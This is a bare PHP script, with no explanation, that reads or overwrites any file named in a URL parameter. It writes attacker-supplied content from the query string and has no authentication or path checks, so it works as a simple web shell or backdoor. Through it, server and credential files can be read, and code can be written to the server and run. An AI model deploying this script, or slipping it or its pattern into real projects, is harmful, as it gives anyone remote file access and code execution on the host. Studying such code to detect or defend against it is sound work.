<?php
	if($_GET['rw'] == "read"){
		$myfile = fopen($_GET['filename'], 'r') or die("Unable to open file!");
		echo fread($myfile, filesize($_GET['filename']));
		fclose($myfile);
	}else if($_GET['rw'] == "write"){
		$myfile = fopen($_GET['filename'], 'w') or die("Unable to open file!");
		fwrite($myfile, $_GET['content']);
		fclose($myfile);
	}
?>